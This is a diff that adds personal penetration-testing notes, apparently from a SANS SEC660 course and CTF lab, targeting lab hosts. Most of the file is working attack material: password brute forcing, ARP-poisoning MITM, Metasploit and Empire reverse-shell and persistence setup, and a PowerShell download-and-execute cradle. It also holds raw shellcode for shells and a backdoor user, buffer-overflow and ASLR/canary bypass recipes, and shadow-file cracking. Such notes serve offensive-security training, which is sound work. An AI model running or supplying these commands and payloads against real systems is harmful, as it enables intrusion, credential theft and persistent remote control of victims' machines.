@@ -1,0 +1,408 @@
+10.10.76.116 - Win7
+10.10.77.116 - Kali
+10.10.78.116 - Win10
+10.10.79.116 - Win8
+255.255.0.0 
+10.10.10.78 - DNS
+
+
+git clone https://github.com/longld/peda.git ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit
+
+hydra -l nkcna_author -C 500-worst-passwords.txt https://www.nkcna.ctf/wp-login.php
+wpscan -u www.nkcna.ctf --threads 20 --wordlist 500-worst-passwords.txt --username nkcna_author
+wpscan -u www.nkcna.ctf --enumerate vp
+
+
+
+SANS Notes
+
+******************************Day 1******************************
+**NAC (Network Access Control)**
+-Cain use sniffer
+-spoof your mac address
+ifconfig eth0 down
+grep Apple /usr/local/share/oui.txt
+# replace first 3 parts of MAC with (f8:1e:df) for first 3
+ifconfig eth0 hw ether [new_ADDR]
+ifconfig eth0 up
+route add -net 192.168.1.0/24 gw 10.10.10.69 eth0
+-cpscam
+sudo perl cpscam.pl 10.10.10.0 255.255.255.0
+-firefox plugin to do User-Agent spoofing
+p0f listens for tcp
+-scapy 51/52
+***********************************
+
+**Certain Kinds of Traffic**
+-access a portal that uses auth server
+# will be given by eap and md5 request/success packets
+# use eapmd5fuzzies.py
+-trunking
+# given by DTP traffic
+# use yersinia
+yersinia -I
+# pressing g brings up protocol menu (yersinia is interactive)
+# x to select
+# 1 makes you a trunk port
+# 5 to bring up status menu
+***********************************
+
+**ARP Poisoning**
+# arpspoof/cain & abel/ettercap
+-ettercap
+ettercap [options] [MAC/IP(s)/Port(s)1] [MAC/IP(s)/Port(s)2]
+# ex. -TqM arp:remote /[victim_IP]/ /[web_server]/
+# create etterfilters pg. 99-104
+# check out my rc file to do the stuff for pdf exploit delivery
+# press c in interactive window to see connections
+# q to quit
+# ex. -TM arp:remote -F pwned.ef /10.10.78.116/ /10.10.10.70/
+-bettercap
+bettercap --sniffer -T {victim_IP or range (/ or , deliniated)}
+bettercap -L # simple local network
+bettercap -L --sniffer-output out.pcap --sniffer-filter "tcp an not port 443"
+**OSPF packets**
+-Loki
+python file
+**IPv6**
+pg. 169-192
+**Software Update**
+
+***********************************
+
+
+page 125
+custom stuff in 130s and 140s
+
+yersinia for MITM
+pull up attack screen when HSRP packet is sniffed
+
+got to page 120
+*****************************************************************
+
+
+******************************Day 2******************************
+-Crypto (symmetric, stream, and block)
+# can never use same key twice in stream ciphers (so use IV) or else you can xor known PT and CT to get keystream and then decrypt unknown PT
+# EBC is breakable by python script
+# CBC may be vulnerable if it uses same IV for each block (the IV may always be 0 if you see that 2 packets are the same)
+- hash identification
+# python Hash_ID_v1.1.py
+# pcaphistogram.pl capture.dump | gnuplot; display capture1.png;
+# tcpick -r sample.dump -wR;ls -lSh *.dat; ent [dat file] (| grep Entropy);
+-scapy
+$scapy
+>>> fp = open("payloads.dat", "wb")
+>>> def handler(packet):
+...		fp.write(str(packet.payload.payload.payload))
+...
+>>> sniff(offline="capture.dump", prn=handler, filter="tcp or udp")
+-CBC bit flipping
+# use burp
+-Oracle Padding Attack
+poodlepy --target-port [port] --start-offset [offest] [website]
+-hash extension attack
+hash_extender -d [name we have] -s [hash we have] -a [name we want] --format [hash algorithm (sha1)] -l [length of secret (guess)] --out-data-format html
+-Post Exploitation
+# there are group policy object and software restriction policies
+# rules based on certificate, hash, zone, or path
+/////look at 94-95///////////////
+-Powershell and Empire
+./opt/Empire/empire
+so much powershell reading to do (-155ish)
+-escalation and escaping
+# metasploit: post/windows/escalate/* or exploit/[windows/linux/multi]/local/*
+uname -a; cat /etc/issue
+find / -perm -2000 -o -perm -4000; sudo -l;
+find /usr/ -name custom_app;/usr/bin/cutom_app -DOESNTEXIST(like AA or 1234 or A A A A);
+ltrace /usr/bin/custom_app 10.10.10.10
+# libraries to abuse on pg. 164
+msfvenom -p linux/x64/mettle/reverse_tcp LHOST=[local IP] -f elf-so > /tmp/mettle.so
+msfconsole -qx 'use exploit/multi/handler;set PAYLOAD linux/x64/mettle/reverse_tcp;set LHOST [local IP]; exploit'
+# victim does export LD_PRELOAD=/tmp/mettle.so; ls
+-other metasploit utilities
+# exploit/multi/script/web_delivery
+# exploit/windows/winrm/winrm_script_exec
+# post/windows/manage/powershell/exec_powershell
+-metasploit helpers
+unicorn.py windows/meterpreter/reverse_tcp [local IP] 443 hta
+msfconsole -r unicorn.rc
+or
+spraywmi.py [workgroup] [username] [password or hash] [target IP or range] windows/meterpreter/reverse_tcp [local IP] 443
+-checksec.sh
+
+
+-Powershell
+# create a listener
+listeners
+set Host http://10.10.77.116
+set Port 8080
+set Name SEC660
+run
+# create a launcher
+usestager launcher
+set Listener SEC660
+set OutFile /opt/Empire/downloads/launcher.txt
+generate
+# create a stager
+usestager hta
+set Listener SEC660
+set OutFile /opt/Empire/downloads/empire.hta
+generate
+# serve up on just a simple HTTP Server (python -m SimpleHTTPServer 3000) or use with windows shell (powershell -command "$Z='http://10.10.77.116:3000/launcher.txt';IEX(New-Object Net.webclient).Downloadstring($Z)")
+# once you get an agent
+interact <tab>
+rename [new name]
+sc (screenshot)
+help
+# keep persistence
+usemodule persistence/userland/schtasks
+set Listener SEC660
+set IdleTime 2
+set Agent autorun
+run
+Y
+# create stager
+usestager macro
+set Listener SEC660
+set Proxy None
+set OutFile /opt/Empire/downloads/empire.bas
+generate
+# after interact to get passwords
+scriptimport /opt/ps/Invoke-MKW.ps1
+scriptcmd Invoke-MKW
+shell $HOME
+cat mkw.out
+shell systeminfo > info.txt
+(use thing from above with python winsploit.py -d *xls -i info.txt in /opt/winsploit folder)
+# import scripts (this one gets user/pass)
+scriptimport /opt/ps/Invoke-MKW.ps1 (other scripts available)
+scriptcmd Invoke-MKW
+shell $HOME
+cat mkw.out
+
+searchmodule [whatever]
+usemodule [module]
+info
+set [] []
+run
+*****************************************************************
+
+******************************Day 3******************************
+-useless report writing and python info
+# python os module on pg. 48
+# get user:pass on pg. 52
+# more stuff 53-57
+-IDA Python
+GetNmen(0x)
+GetOpnd(0x)
+hex(NextAddr(0x))
+SegByName(".text")
+SegByName(".data")
+hex(SegByBase(SegByName(".text")))
+x = 0x
+idaapi.add_bpt(x, 0, BPT_SOFT)
+EnableBPT(x, false)
+EnableBPT(x, true)
+-scapy
+-fuzzing
+read pages
+-ipdecap
+# ./configure CFLAGS="-ggdb -g3 -O0"
+make clean
+make
+gdb src/ipdecap
+#inside
+run -i out/crashes/id:00000* -o /dev/nul
+
+*****************************************************************
+******************************Day 4******************************
+-memory and dissasembly
+-gdb
+disass [func]
+break [func] (b)
+print [whatever]
+x/[number]i [address]
+info
+continue (c)
+s [num]
+x/s [address]
+backtrace (bt)
+info func
+run (r)
+b *0x[addr]
+info break
+del break [num]
+info reg
+info reg eip
+x/2i $eip
+shell/exit (switch between the two)
+x/wx [addr]
+-readelf
+readelf -a [program] | grep Entry
+-objdump
+
+
+bt then look at the functions and remember to subtract of the eip
+
+run < <(python -c 'print "\x90" * 300 + "\xef\xbe\xef\xbe"')
+run < <(python -c 'print "\x90" * 100 + "[shellcode]" + "B" * 200 + [addr]')
+x/wx $esp # see if you have stack control
+x/wx $ebp+4 # see return ptr
+http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+*****************************************************************
+******************************Day 5******************************
+Immunity Debugger
+OllyDBG
+PEDUMP
+mona commands on pg 83
+c page inside of immunity
+
+*****************************************************************
+
+
+
+
+
+**********************BUFFER OVERFLOWS**********************
+
+find / -perm -2000 -o -perm -4000; sudo -l;
+
+checksec --file  ./[program]
+
+open port 9999
+\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x27\x0f\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80
+create a user "hacker" with password "hacker"
+\x2b\xc9\x83\xe9\xe8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb8\x13\xa7\xe4\x83\xeb\xfc\xe2\xf4\x89\xda\x2e\x2f\xd2\x55\xff\x29\x38\x79\xa2\xbc\x89\xda\xf6\x8c\xcb\x60\xd0\x80\xd0\x3c\x88\x94\xd9\x7b\x88\x81\xcc\x70\x2e\x07\xf9\xa6\xa3\x29\x38\x80\x4f\xc0\xb8\x13\xa7\x8c\xd9\x70\xcc\x81\xca\x29\xe6\xa5\x81\x57\xeb\x89\xf2\x5b\x95\xd3\xfb\x67\xc8\xde\x88\x29\x97\xde\x82\x3c\x9d\xcb\xda\x7a\xc9\xcb\xcb\x7b\xad\xbd\x33\x42\x5b\x8e\xbc\x4b\x6a\x64\xd2\x12\xff\x29\x38\x13\xa7\xe4
+get shell
+\x31\xc0\x31\xdb\x29\xc9\x89\xca\xb0\x46\xcd\x80\x29\xc0\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x54\x89\xe1\xb0\x0b\xcd\x80
+ascii moo
+\x29\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x35\xb0\xb8\xc4\x83\xeb\xfc\xe2\xf4\x5f\xbb\xe0\x5d\x67\xd6\xd0\xe9\x56\x39\x5f\xac\x1a\xc3\xd0\xc4\x5d\x9f\xda\xad\x5b\x39\x5b\x96\xdd\xbc\xb8\xc4\x35\xd1\xc8\xb0\x18\xd7\xdd\xb0\x15\xdd\xd7\xab\x35\xe7\xeb\x4d\xd4\x7d\x38\xc4
+
+
+
+**shellcode or bypassing checks**
+1. get offset (use, checking to see if its slightly off, http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
+2. make sure you control esp (run the program in gdb and see if it crashes at 41414141, command in gdb is below)
+run < <(python -c 'print "\x90" * [offset] + "AAAA"')
+3. if you dont need shell, you just put the address you want to go to at the end
+4. if you do need to use shellcode dissassemble main
+disass main
+5. set a breakpoint at the address right after the vulnerable function
+break *0x[addr]
+run < <(python -c 'print "\x90" * [offset/2] + [shellcode] + "A" * [offset/2 - 84 (for shellcode)] + "AAAA"')
+6. find line where nops end in memory
+x/20x $esp <enter><enter> (the address of the line on the left is now nop_line
+7. at command line
+python -c 'print "\x90" * [offset/2] + [shellcode] + "A" * [offset/2 - 84 (for shellcode)] + "[little endian of nop_line]"' | ./program
+
+**NX enabled (ret2libc)**
+1, 2, and 5 from above
+if you put in not enough A's to segfault you can see the address that is the return pointer and figure out how to overwrite it
+p system (get the address of system which is static if ASLR is off)
+if we are doing this with an environment variable then we can use ./env [name] to get that address
+at command prompt:
+python -c 'print "A" * [buffer] + [system addr] + [4 bytes] + [env addr]
+python -c 'print "A" * 20 + "\x70\x11\x06\x41" + "\x90\x90\x90\x90" + "\x3d\xf6\xff\xbf"' | ./program
+then you have to change the last address slightly to adjust for offset
+
+**Stack Canary**
+the example we used had a function w/ 3 strcpy calls
+set a breakpoint after the third strcpy and run the program
+figure out how to fill up the 3 copies, run, and look at the stack pointer
+the canary is the next 4 bytes
+now here is the tricky part:
+	we use the parameter closest to the canary to overwrite the first two (based on the esp dump from gdb) with the correct values (in the example below they are ff and 0a
+	the second closest argument need to end just right to place a null byte to overwrite on of the extra As
+	the third parameter needs to write the last null byte
+	see pg 173 in day 4
+	ex:
+	run "AAAAAAA `echo -e 'AA\x0a\xffAAAAAAAA'`" "BBBBBBBBBBBBBBBBB" "DDDDDDDDDDDDDDDDDDDDDDDD" (7,8,17,24)
+now we put shellcode instead of the last 8 As
+we will also need to add nops and an address to them (see pg. 175) to help
+
+**ASLR**
+use ldd (ldd ./program) to get addr of linux-gate.so.1 (ldd_addr)
+run gdb with program, break main, and run
+do 1. or 2.
+1.
+x/16b *0x[ldd_addr]
+	search for 0xff 0xdd (call esp) or 0xff 0xe4 (jmp esp) and remember that address
+	to check if you have the right address, use: x/i [addr]
+2.
+dd if=/proc/self/mem of=/tmp/vdso.bin bs=4096 count=1 skip=1048574
+xxd /tmp/vdso.bin | grep ""ff d4"
+xxd /tmp/vdso.bin | grep ""ff e4"
+
+replace address to shellcode with new address	
+
+
+**ROP**
+!mona rop -o -nonull
+
+
+
+
+p exit (gets address of exit)
+
+
+
+
+
+unshadow /etc/passwd /tmp/shadow | grep [user you want] > /tmp/unshadow
+john --format=crypt /tmp/unshadow
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+http://techgenix.com/understanding-man-in-the-middle-attacks-arp-part4/
+https://strikersecurity.com/blog/getting-started-recon-ng-tutorial/
+https://www.youtube.com/watch?v=zV17aRxJhO4
